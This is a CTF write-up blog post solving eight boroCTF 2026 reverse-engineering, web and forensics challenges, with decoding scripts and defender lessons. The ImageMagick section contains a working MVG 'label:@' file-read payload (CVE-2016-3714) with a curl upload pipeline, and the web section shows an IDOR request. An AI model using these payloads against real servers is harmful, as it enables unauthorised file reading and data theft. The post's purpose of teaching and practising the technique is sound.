---
title: "boroCTF 2026 Writeup: All 8 Challenges Solved Across Reverse, Web, and Forensics"
slug: "boroctf-2026-writeup"
description: "boroCTF 2026 full writeup — 5 reverse, 2 web, 1 forensics. XOR-7 ELFs, AHK hotstrings, LCG + marshal puzzle, PDF object streams, ImageTragick MVG label:@, and ext4 block slack."
date: 2026-06-25T22:00:00Z
lastmod: 2026-06-25T22:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["boroCTF 2026"]
tags:
  - "boroctf"
  - "boroctf 2026"
  - "reverse engineering"
  - "web exploitation"
  - "forensics"
  - "imagetragick"
  - "cve-2016-3714"
  - "autohotkey rcdata"
  - "ext4 block slack"
  - "idor"
  - "pdf object stream"
  - "python marshal puzzle"
  - "lcg stream cipher"
keywords:
  - "boroctf 2026 writeup"
  - "boroctf writeup"
  - "password_protected boroctf"
  - "big_brother boroctf autohotkey"
  - "labyrinth boroctf marshal lcg"
  - "financial_report boroctf pdf"
  - "alphacode boroctf custom language"
  - "boro-senpai 1 idor steins;gate"
  - "kobeni dashboard imagetragick mvg label"
  - "slack boroctf ext4 blkls"
  - "blkls -s ext4 slack extract"
  - "imagemagick label:@ file read"
  - "movabsq strcmp xor stripped elf"
  - "autohotkey hotstring rcdata reverse"
  - "marshal.loads code object brute"
toc: true
cover:
  image: "/images/articles/boroctf-2026-writeup.png"
  alt: "boroCTF 2026 writeup — 8 challenges solved across reverse, web, and forensics"
---

**boroCTF 2026** is a Jeopardy-style CTF with a tight, opinionated challenge set. The 2026 edition shipped eight challenges across reverse engineering, web exploitation, and forensics. The reverse track is the heaviest at five challenges (a stripped XOR-7 ELF, an AutoHotkey hotstring keylogger, a Python LCG + `marshal.loads` puzzle, a tiny PDF object-stream stash, and a custom DSL whose interpreter has to be reverse-engineered from probing). The web track has two themed challenges (a Steins;Gate-flavoured IDOR and a Chainsaw Man-themed ImageTragick lab). The forensics track ships one ext4 image whose flag hides in block slack.

This is the full master writeup. All eight challenges were solved end-to-end. Each section covers the surface, the bug or trick, the exploit chain, and the recovered flag. Full per-challenge reproductions (solver scripts, exact byte offsets, payload MVGs, the AlphaCode DSL semantics table) live in the source repository at [Abdelkad3r/boroCTF-2026](https://github.com/Abdelkad3r/boroCTF-2026).

## The event at a glance

| Category | Challenge | Core technique | Flag |
|---|---|---|---|
| Reverse | password_protected | `movabsq` stacked password + XOR-7 deobfuscation loop in a stripped ELF; the strcmp gate is decorative | `boroCTF{I_H8_M@7ing_StR1ng5_cHals}` |
| Reverse | big_brother | AutoHotkey-compiled PE whose embedded script lives as `RCDATA` and uses an `Chr()`-concatenated hotstring trigger | `boroCTF{AHK_1s_lIs+eni4g}` |
| Reverse | financial_report | 1 KB PDF whose object stream contains an OpenAction JavaScript with a base64-encoded flag among arithmetic decoys | `boroCTF{0n1_F!le_I5_@11_it_tAke$}` |
| Reverse | labyrinth | Random-grid maze where `hope()` runs `marshal.loads` on `LCG-XOR(sequence, mod)`; brute-force the 10k mod values, pre-filter on the `0xE3` code-object marker | `boroCTF{es4@pe_wA5_1nev!table}` |
| Reverse | AlphaCode | Custom DSL with six opcodes; the "one `zm` per program" parser rule is actually "one open function at a time", which lets you stage multiple literals on the queue and concatenate the gauntlet template | `boroCTF{r3verse_by_guessncheck}` |
| Web | boro-senpai 1 | IDOR on `/profile/<username>`; canon-OSINT identifies Makise Kurisu's `KuriGohanandKamehameha` handle and the route returns her profile without authorisation | `boroCTF{3l_psY_c0ngR00!}` |
| Web | Kobeni's Dashboard | ImageMagick 6 with permissive `policy.xml`; user-controlled filename extension picks the input coder, and an MVG `label:@/flag.txt` payload renders the flag into the returned thumbnail (CVE-2016-3714) | `boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}` |
| Forensics | slack | 10 MB ext4 image with 500 small files whose interesting state is in the per-block tail-slack space; `blkls -s` extracts it and the flag is the non-zero bytes | `boroCTF{C0u!D_yo8_cuT_m3_Som4_sL@ck}` |

8 flags. Per-challenge reproductions and solver scripts in the source repository.

## Methodology — read the artifact, not the wrapper

A pattern that worked across the entire event: don't trust the wrapper. The wrapper is the challenge prompt, the visible UI label, the obvious-looking decoy, the natural-language framing. The artifact is the bytes, the disassembly, the response body, the filesystem image. Every challenge in this event rewarded solvers who let the artifact speak first.

password_protected's wrapper says "strcmp is the gate." The artifact says "the strcmp branch only triggers a XOR-7 reveal loop over a pre-baked 34-byte buffer." big_brother's wrapper says "complex Windows reverse." The artifact says "AutoHotkey script glued to an interpreter, plain-text in `.rsrc`." Kobeni's Dashboard's wrapper says "image upload form, JPG/PNG/GIF/BMP only." The artifact says "the server picks the IM input coder from the filename extension and the IM policy is permissive."

This is the entire shape of the event. Per-challenge walkthroughs follow.

## Reverse engineering — five challenges, five different tricks

### password_protected

A stripped 64-bit Linux ELF (PIE, GCC 13.3) that prompts for a password and prints either a success message + flag or `My disappointment is immeasurable.`

**Recon.** `strings` immediately surfaces four 8-byte fragments that look like an embedded password:

```
$ strings password_protected | grep -E 'Rate|Beca|reat|allenge'
Rate5Sta
BecauseG
reatChal
allenge
```

Those exact lengths are the smoking gun. 8-byte fragments are the natural shape of x86-64 `movabsq` immediates, and `objdump -d` confirms the binary builds the password on the stack one 8-byte chunk at a time, calling `strlen()` between writes to position each chunk at the end of the growing buffer:

| addr | bytes | resulting buffer |
|---|---|---|
| `0x1336` | `0x6174533565746152` ("Rate5Sta") | `Rate5Sta` |
| `0x1340` | `0x7372` ("rs") | `Rate5Stars` |
| `0x1459` | `0x4765737561636542` ("BecauseG") | `…BecauseG` |
| `0x1463` | `0x6c61684374616572` ("reatChal") | `…reatChal` |
| `0x1474` | `0x65676e656c6c61` ("allenge\0") | `…allenge` |

The reassembled buffer is `Rate5StarsBecauseGreatChallenge`. `strcmp` at `0x1496` is the only gate, and the `jne` at `0x149d` is the only branch off the success path.

**The interesting part.** The flag is not the password. The flag is what the success path prints. Between `0x1248` and `0x132f`, `main` initialises a 34-byte buffer at `-0x1a0(%rbp)` one `movb` at a time. On a successful `strcmp`, a loop at `0x14ba..0x1503` walks that buffer, XORs each byte with `0x7`, and `putchar`s it. The flag never appears in the binary as plaintext.

**Decode without running.** Pull the 34 obfuscated bytes from the disassembly and XOR with `0x7`:

```python
buf = [0x65,0x68,0x75,0x68,0x44,0x53,0x41,0x7c,0x4e,0x58,0x4f,0x3f,0x58,
       0x4a,0x47,0x30,0x6e,0x69,0x60,0x58,0x54,0x73,0x55,0x36,0x69,0x60,
       0x32,0x58,0x64,0x4f,0x66,0x6b,0x74,0x7a]
print(''.join(chr(b ^ 0x7) for b in buf))
# boroCTF{I_H8_M@7ing_StR1ng5_cHals}
```

The flag itself is the wink: "I hate matching strings challenges" is what the author thinks of the `strcmp` gate the challenge looks like at first read.

### big_brother

A ~914 KB Windows GUI executable. `file` says `PE32 executable (GUI) Intel 80386`. The challenge name hints at surveillance.

**Recon.** `strings` is enough to identify the binary as a compiled AutoHotkey script: a `<assembly>` manifest naming AutoHotkey, imports of `RegisterHotKey`, `GetAsyncKeyState`, `MapVirtualKeyExW`, and plain-text fragments of the script itself. AHK's compile mode is "interpreter + script glued together". The script lives as `RCDATA` (resource type 10) in the PE's `.rsrc` section, and tools like `wrestool -x -t10 big_brother` or Resource Hacker extract it cleanly. In this build the script is so close to plaintext that even `strings` surfaces the whole thing.

**The script:**

```ahk
:*:iloveboroctf::
secret := Chr(98) . Chr(111) . Chr(114) . Chr(111) . Chr(67) . Chr(84) . Chr(70) . Chr(123)
secret := secret . Chr(65) . Chr(72) . Chr(75) . Chr(95) . Chr(49) . Chr(115) . Chr(95)
secret := secret . Chr(108) . Chr(73) . Chr(115) . Chr(43) . Chr(101) . Chr(110) . Chr(105)
secret := secret . Chr(52) . Chr(103) . Chr(125)
MsgBox, 64, System Notification, Access Granted!`n`nFlag: %secret%
```

`:*:iloveboroctf::` is an AHK hotstring with the `*` flag. The trigger fires the moment the literal `iloveboroctf` is typed anywhere on the system, no end-character required. That's the "big brother" theme: AHK's low-level keyboard hook watches every keystroke for the trigger.

**Decode without running.** The flag is a `Chr()`-concatenated obfuscation that fools a naive `strings | grep boroCTF` but no actual reverser:

```python
codes = [98,111,114,111,67,84,70,123,
         65,72,75,95,49,115,95,
         108,73,115,43,101,110,105,
         52,103,125]
print(''.join(chr(c) for c in codes))
# boroCTF{AHK_1s_lIs+eni4g}
```

Reads as "AHK is listening." A real reverser also has the option of running the binary on a Windows VM and typing `iloveboroctf` anywhere (Notepad works) to fire the `Access Granted!` MessageBox, but you don't need to.

### financial_report

A 1080-byte PDF. The name is "financial report"; the file is 1 KB. That mismatch is the first signal that the artifact is misleading the wrapper.

**Decompress the object stream.** PDFs of this shape use a single `/ObjStm` (object stream) holding several sub-objects. Extract it:

```python
import zlib
data = open('financial_report', 'rb').read()
raw  = data[data.find(b'stream\n') + 7 : data.find(b'endstream')].rstrip()
text = zlib.decompress(raw).decode('latin-1')
print(text)
```

Equivalent tools: `qpdf --qdf in.pdf out.pdf`, `mutool clean -d`, `pdf-parser.py -f`. All produce the same decompressed object stream.

**Two interesting objects.** A catalog `/OpenAction` wired to a JavaScript blob that runs on document open, plus a widget annotation rendered as a "Click me for free flag!" button. The JavaScript:

```js
var a = 7;
var b = 13;
var c = a * b;
var d = c - a;
var e = [a, b, c, d];
// ... more arithmetic decoys ...
var encoded = "Ym9yb0NURnswbjFfRiFsZV9JNV9AMTFfaXRfdEFrZSR9";
var decoded = util.printd("yyyy", new Date());
```

All the arithmetic is dead. Nothing reads `e` or `decoded`. The literal `encoded` is the entire payload. The widget annotation is a decoy: clicking the button in Adobe Reader fires `app.alert("Ya, I'm not making it that easy.")` and refuses to print anything else.

**Decode.** Base64 the literal:

```python
import base64
base64.b64decode('Ym9yb0NURnswbjFfRiFsZV9JNV9AMTFfaXRfdEFrZSR9').decode()
# boroCTF{0n1_F!le_I5_@11_it_tAke$}
```

The flag's wink: "one file is all it takes" matches the 1 KB PDF claiming to be a financial report.

### labyrinth

A 5 KB Python script. You spawn at `(50, 50)` on a 100×100 grid and try to escape a Minotaur. Each turn the maze regenerates random walls, you pick `N`/`S`/`E`/`W`, and a `hope()` function is called. After 100 turns the script prints:

```
The bull finds you. It is not a painless death.
```

The maze is unwinnable by play. The entire challenge is static analysis on `hope()`.

**Read hope().**

```python
def hope():
    try:
        mod = (player_pos[0] ^ (player_pos[1] + player_pos[1])) * player_pos[0]
        decrypted = rsa_encrypt(sequence, mod)         # misnamed
        code      = marshal.loads(decrypted)
        impossible = types.FunctionType(code, globals(), "impossible")
        impossible()
    except Exception:
        pass
```

Three things matter:

1. `rsa_encrypt` is a misnomer. The actual implementation is an XOR stream whose keystream is a glibc-style LCG seeded by `mod`. The constants `1103515245` and `12345` are the smoking gun: the classic Numerical Recipes / glibc `rand()` LCG.
2. The decrypted bytes are passed to `marshal.loads`. If they happen to parse as a valid Python code object, `FunctionType` wraps it and `impossible()` calls it. This is arbitrary-code-execution-as-a-puzzle.
3. `except Exception: pass` is the entire safety net. Every wrong `mod` raises and the failure is swallowed silently.

So the puzzle reduces to: find the unique `(r, c)` whose `mod = (r ^ (c+c)) * r` decrypts the embedded 512-byte `sequence` into a valid marshal'd code object.

**Brute-force, but pre-filter.** A naive brute over the 10,000 cells is slow because `marshal.loads` on random bytes can allocate gigabytes when the first byte happens to parse as a giant `TYPE_LONG` / `TYPE_TUPLE` / `TYPE_DICT` header. Pre-filter on the `0xE3` top-level marker byte (`TYPE_CODE | FLAG_REF` in modern Python) to narrow 10,000 cells to about 17:

```python
import marshal

LCG_A, LCG_C = 1103515245, 12345

def stream_decrypt(data, seed):
    state = seed & 0xFFFFFFFF
    out = bytearray()
    for b in data:
        state = (LCG_A * state + LCG_C) & 0xFFFFFFFF
        out.append(b ^ ((state >> 16) & 0xFF))
    return bytes(out)

for r in range(100):
    for c in range(100):
        mod = (r ^ (c + c)) * r
        decrypted = stream_decrypt(sequence, mod)
        if decrypted[:1] != b'\xe3':
            continue
        try:
            code = marshal.loads(decrypted)
        except Exception:
            continue
        print(r, c, mod, code.co_consts)
```

One cell decrypts to a clean code object: `(91, 68)`, with `mod = (91 ^ 136) * 91 = 19201`. Its `co_consts` tuple is:

```python
(None, 'Ym9yb0NURntlczRAcGVfd0E1XzFuZXYhdGFibGV9', 1, 2, 3)
```

Base64-decode the string constant:

```python
base64.b64decode('Ym9yb0NURntlczRAcGVfd0E1XzFuZXYhdGFibGV9').decode()
# boroCTF{es4@pe_wA5_1nev!table}
```

"Escape was inevitable" because the maze never had a play-through win; the only escape was the one the static analyst was always going to find.

### AlphaCode

The hardest reverse of the event. The handout is two `.ac` files (one prints "hello world", one reads a name and prints "hello {name}"). The remote is an `ALPHACODE COMPILER` with two modes: a Compile mode that runs your snippet against your own stdin, and a **Gauntlet** mode that runs your snippet three times with three fixed input sets, expecting each run to emit exactly:

```
Hello I am {input 3}, and I like {input 2}.
I hate {input 1}.
```

The flag drops if all three runs match.

**Literal encoding.** Each token in a literal line is 1–5 lowercase letters that decodes to one printable ASCII byte:

```
ord(ch) = 32 + Σ letter_index(c)        where 'a' = 0 ... 'z' = 25
```

`awzz` → `0+22+25+25 = 72` → `chr(72+32) = 'h'`. The sum is non-negative, so the minimum encodable byte is space (32). Newline (10) **cannot** be encoded inside a literal. That matters later.

**Opcode discovery.** Sweep every `zz <aa..zz>` and classify responses (`Invalid line N` vs silent execution). Six valid opcodes survive:

| Op | Effect |
|---|---|
| `zz fi` | read one line from stdin |
| `zz fo` | print the current effective front + `\n` |
| `zz fr` | capture / extend a pending prefix |
| `zz dp` | pop the front, apply the pending prefix to the new front |
| `zz dx` | rotate the queue left (front → back) |
| `zz di` | close a function body |

The "obvious" model of `zz fr`, "prefix the current front onto every later queue item," matches `helloyou.ac` but predicts wrong outputs when the queue grows beyond two items. Probing further yields the actual semantics:

```
state: queue Q, pending P (str | None), flag (bool)

fr:  if flag: P = P + Q[0]            # append while flag is hot
     else:    P = Q[0]                # otherwise overwrite
     flag = True

fo:  if flag: print P + Q[0] + '\n'
     else:    print Q[0] + '\n'
     P = None; flag = False           # ALWAYS clears P and flag

dp:  Q.pop(0)
     if P: Q[0] = P + Q[0]            # apply pending, but PRESERVE P
     flag = False

dx:  rotate Q left                    # P and flag preserved
```

Three non-obvious behaviours: `dp` preserves `P` after applying it (so a chain of `dp`s re-stamps the prefix), `fo` always clears `P`, and `fr` *appends* to `P` while the flag is still hot from a prior `fr`.

**The parser-rule crack.** Even with the richer model, every printed line is a concatenation of items drawn from `{L, in1, in2, in3}`, and gauntlet inputs never contain the separator strings. Plain concatenation can't slot fixed text between two inputs with a single literal.

The crack: the parser rule isn't "one `zm` per program." It's "one *open* function at a time." Once the current function has been called, opening another `zm` is fine. That lets you push an arbitrary number of literal pieces:

```
zm a / <literal A> / zz di / a / zm b / <literal B> / zz di / b / fo / dp / fo
```

Verified on the live compiler: that snippet prints `B\nA\n`.

**Building the gauntlet output.** Five function definitions (three carrying `zz fi`) build the queue:

```
[ L1="Hello I am ",  in3,  L2=", and I like ",  in2,  L3=".",  L4="I hate ",  in1,  L5="." ]
```

`fi` calls fire in the order they execute, not in the order their defining functions are declared. By calling `e`, `d`, `c`, `b`, `a` in that order, the three `fi` calls inside `d`, `b`, `a` consume `in1`, `in2`, `in3` in natural read order, while the call sequence pushes `L5, L4, L3, L2, L1` onto the front of the queue. Four `fr; dp` pairs collapse the first five items, `fo` prints line 1, `dp` discards, two more `fr; dp` pairs + `fo` print line 2.

**Solver shape** (full code in [`reverse/AlphaCode/solve.py`](https://github.com/Abdelkad3r/boroCTF-2026/tree/main/reverse/AlphaCode)):

```python
snippet = "\n".join([
    "zm e", enc("."),                "zz di", "e",
    "zm d", enc("I hate "),  "zz fi","zz di", "d",
    "zm c", enc("."),                "zz di", "c",
    "zm b", enc(", and I like "), "zz fi", "zz di", "b",
    "zm a", enc("Hello I am "), "zz fi", "zz di", "a",
    "zz fr","zz dp","zz fr","zz dp",
    "zz fr","zz dp","zz fr","zz dp","zz fo",
    "zz dp",
    "zz fr","zz dp","zz fr","zz dp","zz fo",
    "ex",
])
```

`enc` is the literal encoder: each character becomes a 4-letter lowercase token whose letter-indices sum to `ord(ch) - 32`. The edge case is that the resulting token must not start with `zz` (the parser would eat it as an opcode and discard the literal). The encoder rebalances by knocking the first letter from `z` to `y` and bumping a later letter with slack.

Submit to gauntlet, the server prints the three test outputs and then:

```
You may be worthy of this flag: boroCTF{r3verse_by_guessncheck}
```

The flag itself is the meta-wink: this challenge really is reverse engineering by guess-and-check on the opcode semantics.

## Web — IDOR and an ImageTragick lab

### boro-senpai 1

A Steins;Gate-themed imageboard called `@channel`. You land authenticated as `hououin_kyouma` (Okabe's grandiose self-identification). The prompt sets the goal: find his assistant's old @channel handle and her profile is yours.

Two routes are reachable: `/` (the board, with threads and posts) and `/profile/<username>`, where only `hououin_kyouma` is linked in the UI. The profile page tells you "Your profile is visible only to you." That's UI copy from a template, not an authorisation check.

**OSINT half.** In the "Does time travel violate conservation of energy?" thread, a poster named `KuriGohanandKamehameha` drops a serious physics reply. Okabe responds "I shall be observing them." She snaps back "I'm not your lab assistant. Don't @ me." Even without the Steins;Gate canon, the dialogue fingerprints her as Okabe's assistant Makise Kurisu. With the canon, `KuriGohanandKamehameha` is her canonical @channel handle.

**IDOR.** Hit her profile directly:

```bash
curl -s https://<instance>.boroctf.com/profile/KuriGohanandKamehameha \
  | grep -oE 'boroCTF\{[^}]+\}'
# boroCTF{3l_psY_c0ngR00!}
```

The bio carries the flag in a "personal note" field. "Visible only to you" is a template string, not a server-side check. Classic broken object-level authorisation, OWASP API Top-10 #1.

The flag is leet for **"El Psy Kongroo!"**, Okabe's signature catchphrase. The defender lesson is the one this bug class always teaches: **trust-but-verify the UI strings**. Anything in a template can be wrong about what the route handler actually enforces. The handler has to compare `<username>` against the session and refuse if they differ.

### Kobeni's Dashboard

A Chainsaw Man-themed "Public Safety Division Devil Sighting Portal" run by Kobeni Higashiyama. You upload an image; the server returns a thumbnail. The index HTML has a breadcrumb hint:

```html
<!-- Processor: see response headers -->
```

The response header `x-processor: ImageMagick/unknown` is the matching hint.

**Source recovery.** Initial recon is `convert` → ImageMagick → "what's the IM version and what's the policy?" The eventual answer comes from reading the Flask source out of `/proc/self/cwd/app.py` (via the LFI primitive once it's found). The relevant block:

```python
ext       = os.path.splitext(filename)[1].lower().lstrip('.')
input_arg = f'{ext}:{upload_path}' if ext else upload_path
subprocess.run(['convert', input_arg, thumb_path], timeout=5, check=False)
```

The two problems compound:

1. The IM input coder is chosen from the uploaded filename's extension (`{ext}:{upload_path}`). The HTML form claims to accept JPG/PNG/GIF/BMP, but the server happily accepts `.mvg`, `.svg`, `.msl`, `.ps`, anything ImageMagick has a coder for.
2. The IM build is **ImageMagick 6 (Q16) on Ubuntu 18.04** (`/usr/bin/convert-im6.q16`) with a permissive `policy.xml`. The 2016-era "ImageTragick" `label:@<path>` LFI primitive is still live.

**The bug.** ImageMagick's MVG (Magick Vector Graphics) format supports a `label:@<path>` pseudo-coder that reads the file at `<path>` and renders its contents as text inside the output image. With a permissive policy, this is an arbitrary-file-read primitive (CVE-2016-3714).

CVE-2022-44268 (PNG `profile=path` tEXt leak) was tried first and is patched here: the server strips/ignores `Raw profile type *` chunks. The 2016 MVG vector lives at the coder layer, not the PNG parser, and the policy-level patch was never applied.

**Working payload.** Save as `evil.mvg`:

```mvg
push graphic-context
viewbox 0 0 5000 600
font-size 80
image Over 0,0 0,0 'label:@/flag.txt'
pop graphic-context
```

The viewbox and font-size are tuned so the rendered text is large enough to read by eye (OCR mangles leetspeak).

**One-shot pipeline:**

```bash
INSTANCE=https://<your-instance>.boroctf.com
TARGET=/flag.txt

printf "push graphic-context
viewbox 0 0 5000 600
font-size 80
image Over 0,0 0,0 'label:@%s'
pop graphic-context
" "$TARGET" > /tmp/x.mvg

curl -s -F "file=@/tmp/x.mvg;filename=evil.mvg;type=image/x-mvg" "$INSTANCE/upload" \
  | grep -oE 'data:image/png;base64,[A-Za-z0-9+/=]+' \
  | sed 's|data:image/png;base64,||' | base64 -d > /tmp/flag.png

open /tmp/flag.png        # visually read; OCR mangles the leet
```

The returned PNG renders the file contents as a label. Open it and read the bitmap directly:

```
boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}
```

The flag is Denji's running line from Chainsaw Man. **OCR pitfall:** the `'` in `I'v3` is a real ASCII apostrophe, but Tesseract may read it as `!`. The `0`/`o` swap further confuses it. Trust the bitmap, not the OCR.

**Path-probing helper.** Once the primitive works, the response PNG size makes a useful path-existence oracle. At `viewbox 1600x1200`, font-size 18, three bands separate cleanly:

- **~1551 bytes** = empty label (file is empty, unreadable, or null-separated; useful signature for `/proc/1/environ`).
- **~6–9 KB** = IM rendered the literal `@/path/to/thing` as a label (path doesn't expand).
- **≥10 KB** = file exists and IM rendered its content.

`/flag.txt` came back at ~8.7 KB, *just below* a naive "≥10 KB" filter (because the flag string is short). Lower the threshold and eyeball every candidate that differs from the literal-`@`-path baseline.

**Dead ends worth knowing.** CVE-2022-44268 PNG profile-read is patched. The MSL coder (`<image><read filename="…"/></image>`) is disabled at policy. SVG XXE is blocked (entities don't expand). SVG `<text>@/path</text>` doesn't trigger `@` expansion because that's MVG-specific. Filename injection through `subprocess.run` doesn't work because the server uses list form, no shell.

**Defender pattern.** Hard-pick the input coder server-side (e.g. always `png:`), validate by magic bytes, and tighten `policy.xml`. The `{ext}:{upload_path}` design is the root cause; even a strict client-side accept list doesn't matter because the *server* lets the filename choose the coder.

## Forensics — slack

The forensics single-track. A 10 MB ext4 filesystem image. Inside: 500 files named `entry_log_N.txt` (odd `N`) and `exit_log_N.txt` (even `N`) for `N = 1..500`, each holding random printable junk (uniform on chars 33–126). Inode is `N + 11` in each case.

The challenge surface is engineered to look like a covert-channel hunt. Per-file there are sizes (10–100 bytes), generation IDs, access-time nanoseconds, the entry-vs-exit naming pattern. Every one of them looks like it might encode a bitstring. None of them do.

**Channels that don't carry the flag.** Eliminate explicitly:

| Channel | Result |
|---|---|
| Directory-order bit string | Noise |
| Access-time ns quantised | No pattern |
| Inode generation field | No pattern |
| File sizes mod small primes | No pattern |
| Filename parity (entry vs exit) | No pattern |
| `xattr` / immutable / extent flags | All default |

The punchline of the challenge relies on the solver having ruled these out. The flag isn't in any per-file metadata; it's in the filesystem layer below the files.

**The real channel: block slack.** ext4 allocates space in 4 KB blocks. Each handout file is 10–100 bytes. Every allocated block has roughly 4 KB of unused tail space (slack). Sleuthkit's `blkls -s` extracts exactly that:

```bash
blkls -s chal.img > slack.bin
```

That produces 2,048,000 bytes of slack (500 files × 4096 bytes). Out of that, exactly 36 non-zero bytes survive, and reading them in offset order spells the flag:

```bash
tr -d '\0' < slack.bin
# boroCTF{C0u!D_yo8_cuT_m3_Som4_sL@ck}
```

"Could you cut me some slack" matches the title perfectly. The defender takeaway here is the same the forensics community has been teaching for years: **on filesystem-image challenges, run the slack/unallocated extraction first**. `blkls -s` for slack and `blkls -A` for unallocated are cheap, fast, and rule out the entire "bytes hidden in space the filesystem isn't actively using" class before chasing exotic metadata channels.

## Cross-cutting defender takeaways

Three patterns recur across boroCTF 2026 and travel into production work.

**Don't pick the parser from attacker input.** Kobeni's Dashboard's `{ext}:{upload_path}` lets the uploaded filename choose ImageMagick's input coder. Any web stack that picks a parser, a deserialiser, a content-type handler, or a template engine based on user-controlled metadata is one filename away from arbitrary code execution. The fix is to hard-pick the parser server-side and validate the actual content against it.

**UI strings are not security controls.** boro-senpai 1's "Your profile is visible only to you" is a Jinja template, not a route guard. The same shape shows up in dozens of production IDOR reports per quarter on bug bounty platforms. Anywhere a UI promises an access rule, the route handler must enforce it independently. Pen tests should treat "the UI says I can't" as a strong signal that the route handler might not check.

**Forensics challenges hide flags in spaces the filesystem ignores.** ext4 block slack, NTFS Alternate Data Streams, ZIP extra fields, PDF object stream tails, PE overlay data, image EXIF Maker Notes: all of them are "data the filesystem or container allocates but doesn't formally surface." Tooling that walks the canonical structure (a PDF reader, a file manager, an image viewer) silently ignores these regions. Real DFIR tooling does not. `blkls -s`, `exiftool -MakerNotes`, `binwalk -E`, `peepdf`: pick the one for the artifact and run it first.

## Frequently asked questions

### What is boroCTF?

boroCTF is a Jeopardy-style CTF event. The 2026 edition shipped eight challenges across reverse engineering, web exploitation, and forensics. The flag prefix is `boroCTF{...}`. Writeups for every solved challenge live in the source repository at [Abdelkad3r/boroCTF-2026](https://github.com/Abdelkad3r/boroCTF-2026).

### What was the hardest reverse challenge?

`AlphaCode`. The handout is two short `.ac` files in a custom DSL and the remote is a compiler with a "gauntlet" mode that runs your snippet three times against different inputs. Reverse-engineering the six opcodes is one half; the other half is realising the parser's "one `zm` per program" rule is actually "one *open* function at a time," which lets you stage multiple literals on the queue and concatenate them via `fr; dp` pairs to produce text that interleaves the gauntlet's fixed inputs with the required template strings. The full semantics table is in the per-challenge writeup.

### How does password_protected hide the flag?

The strcmp gate against `Rate5StarsBecauseGreatChallenge` is decorative. The actual flag is a 34-byte buffer that `main` initialises one `movb` at a time between `0x1248` and `0x132f`. On a successful strcmp, a loop at `0x14ba..0x1503` XORs each byte with `0x7` and prints it. Pull the bytes from the disassembly, XOR with 7, and the flag falls out without running the binary.

### How do you extract the AutoHotkey script from big_brother?

AutoHotkey's compile mode embeds the script as `RCDATA` (resource type 10) in the PE's `.rsrc` section. `wrestool -x -t10 big_brother` extracts it cleanly, and Resource Hacker on Windows does the same. In this build the script is so close to plaintext that even `strings | grep -A 20 iloveboroctf` surfaces the full hotstring handler and the `Chr()`-concatenated flag. Decode the `Chr()` sequence in Python and the flag is recovered without running the binary.

### What's the LCG trick in labyrinth?

`hope()` runs an XOR stream cipher whose keystream is a glibc-style LCG seeded by `(r ^ (c+c)) * r`. The constants `1103515245` / `12345` are the classic glibc `rand()` LCG. The decrypted bytes are passed to `marshal.loads`. Brute-force the 10,000 `(r, c)` cells, pre-filter on the `0xE3` top-level code-object marker to avoid runaway allocations, and the unique valid cell is `(91, 68)` with `mod = 19201`. Its `co_consts` contains a base64-encoded flag.

### Why pre-filter on `0xE3` in labyrinth?

`marshal.loads` on random data can allocate gigabytes when the first byte happens to parse as a giant `TYPE_LONG` / `TYPE_TUPLE` / `TYPE_DICT` header with attacker-uncontrolled size fields. `0xE3` is `TYPE_CODE | FLAG_REF`, the top-level code-object marker in modern Python. Pre-filtering on this byte narrows the candidate space from 10,000 to about 17 without ever calling `marshal.loads` on a candidate that could explode.

### What's the bug in boro-senpai 1?

IDOR on `/profile/<username>`. The route handler reads the username from the URL and renders that user's profile without comparing it against the authenticated session. The UI string "Your profile is visible only to you" is a template, not a security control. Authorisation has to happen in the handler. The OSINT half identifies Makise Kurisu's `KuriGohanandKamehameha` handle from in-character dialogue in one of the threads.

### What's the ImageTragick payload for Kobeni's Dashboard?

```
push graphic-context
viewbox 0 0 5000 600
font-size 80
image Over 0,0 0,0 'label:@/flag.txt'
pop graphic-context
```

Upload as `evil.mvg`. The server's `{ext}:{upload_path}` design passes the `.mvg` extension to ImageMagick as the input coder, the permissive `policy.xml` allows the MVG coder, and the `label:@<path>` pseudo-coder reads the file and renders its content as text in the returned thumbnail. CVE-2016-3714. The flag has to be read off the rendered bitmap because OCR mangles the leetspeak.

### How do you extract the slack data in the forensics challenge?

`blkls -s <image>` from The Sleuth Kit reads every allocated block and emits only the slack space (the tail of each block from the file's last byte to the end of the block). For a 10 MB ext4 image with 500 files of 10–100 bytes, that's roughly 2 MB of slack. The flag is exactly 36 non-zero bytes; `tr -d '\0'` collapses the output to the flag.

### Where can I find the solver code?

Per-challenge READMEs and solver scripts live at [Abdelkad3r/boroCTF-2026](https://github.com/Abdelkad3r/boroCTF-2026). Each subdirectory carries the writeup plus any reproducer files (the AlphaCode `solve.py` includes the literal encoder and the full snippet builder; the labyrinth and ImageTragick writeups include the working payloads inline; the password_protected writeup carries the 34-byte XOR table and the address map).

### What's the broader lesson from boroCTF 2026?

Read the artifact before you read the wrapper. Every challenge in the event had a prompt or a UI hint that pointed at a more elaborate solve than what was actually needed. password_protected looks like a strcmp bypass; the flag is in a XOR-7 reveal loop. boro-senpai 1 looks like a profile-discovery puzzle; the bug is IDOR. Kobeni's Dashboard looks like a image-format challenge; the bug is the server picking the coder from the filename. The pattern is consistent: the artifact tells you what the bug is faster than the prompt does.

## Closing notes

Eight challenges. Five reverse, two web, one forensics. The reverse track is the meat of the event, and AlphaCode is the centrepiece: a custom DSL whose entire opcode set has to be probed empirically, with one parser quirk that opens the door to the gauntlet template. The web track is two clean themed boxes: an IDOR and an ImageTragick. The forensics single-track is a textbook ext4 block-slack extraction once the per-file metadata decoys have been ruled out.

For more long-form CTF coverage on this site, see the [DalCTF 2026 writeup](/ctf-writeups/dalctf-2026-writeup/) (9 challenges, crypto-heavy), the [BhAcKAri CTF 2026 writeup](/ctf-writeups/bhackari-ctf-2026-writeup/) (8 challenges across web / misc / crypto / reverse), and the [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/) (19 challenges across the full Jeopardy board). The Anti-Slop CTF 2026 series breaks down by category in seven separate posts, starting with the [Anti-Slop web writeup](/ctf-writeups/anti-slopctf-2026-web-writeup/). Full [CTF writeups index](/ctf-writeups/) for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is boroCTF?","acceptedAnswer": {"@type": "Answer","text": "boroCTF is a Jeopardy-style CTF event. The 2026 edition shipped eight challenges across reverse engineering, web exploitation, and forensics. The flag prefix is boroCTF{...}. Writeups for every solved challenge live at github.com/Abdelkad3r/boroCTF-2026."}},
